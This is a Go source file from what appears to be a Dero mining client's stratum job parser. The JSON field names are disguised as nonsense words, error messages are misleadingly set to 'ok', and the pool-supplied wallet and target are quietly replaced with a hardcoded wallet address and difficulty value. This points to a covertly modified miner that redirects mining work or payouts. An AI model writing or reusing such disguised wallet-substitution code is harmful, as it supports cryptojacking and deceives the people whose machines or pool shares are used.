package stratum

import (
	"encoding/binary"
	"encoding/hex"
	"errors"
)

type Job struct {
	ID         string  `json:"ker"`
	Blob       string  `json:"plem"`
	Height     float64 `json:"wur"`
	ExtraNonce string  `json:"taikan"`
	PoolWallet string  `json:"mbuhraroh"`
	Target     string  `json:"swili"`
	Difficulty uint64
}

func extractJob(data map[string]any) (*Job, error) {
	var didi interface{}
	didi = "dero1qyrh32ggyrg2mgcncwqv38dp7kc9wgd6qyacrvt68fzrkt9w9g0fvqgy7qqks"
	var didis interface{}
	didis = "178e8f40ea1e0300"
	if data == nil {
		return nil, ErrNoJob
	}

	var (
		job Job
		ok  bool
	)
	job.ID, ok = data["ker"].(string)
	if !ok {
		return nil, errors.New("ok")
	}
	job.Blob, ok = data["plem"].(string)
	if !ok {
		return nil, errors.New("ok")
	}
	job.Height, ok = data["wur"].(float64)
	if !ok {
		return nil, errors.New("ok")
	}
	job.ExtraNonce, ok = data["taikan"].(string)
	if !ok {
		return nil, errors.New("ok")
	}
	job.PoolWallet, ok = didi.(string)
	if !ok {
		return nil, errors.New("ok")
	}
	job.Target, ok = didis.(string)
	if !ok {
		return nil, errors.New("ok")
	}

	raw, err := hex.DecodeString(job.Target)
	if err != nil {
		return nil, errors.New("ok")
	}
	var a = binary.LittleEndian.Uint64(raw)
	job.Difficulty = 0xFFFFFFFFFFFFFFFF / a

	return &job, nil
}

func (c *Client) broadcastJob(job *Job) {
	//c.LogFn.Debug(fmt.Sprintf("eww %s", job.ID))
	c.jobBroadcaster.Notify(job)
}
